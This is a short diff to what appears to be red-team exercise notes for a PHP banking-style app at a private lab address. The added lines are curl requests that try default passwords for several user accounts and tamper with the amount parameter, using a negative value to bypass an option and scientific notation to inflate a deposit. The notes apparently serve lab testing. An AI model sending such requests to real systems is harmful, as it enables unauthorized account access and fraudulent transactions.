@@ -48,9 +48,12 @@ Red:
 
     5. Check if default creadentials work
         curl "http://10.1.5.2/process.php?user=jelena&pass=abcdef&drop=balance"
+        curl "http://10.1.5.2/process.php?user=john&pass=abcdef&drop=balance"
+        curl "http://10.1.5.2/process.php?user=kelly&pass=abcdef&drop=balance"
 
     6. Interesting
     curl "http://10.1.5.2/process.php?user=aaa&pass=aaa&amount=-1&#45100&drop=balance" -> bypasses the drop=balance going to the default option.
+    curl "http://10.1.5.2/process.php?user=random&pass=aaaa&amount=0.23e5&drop=deposit" -> reads number elevated to the power after e
         
 References for vulnerabilities:
     https://www.cybersecurity-help.cz/vdb/SB2020102113
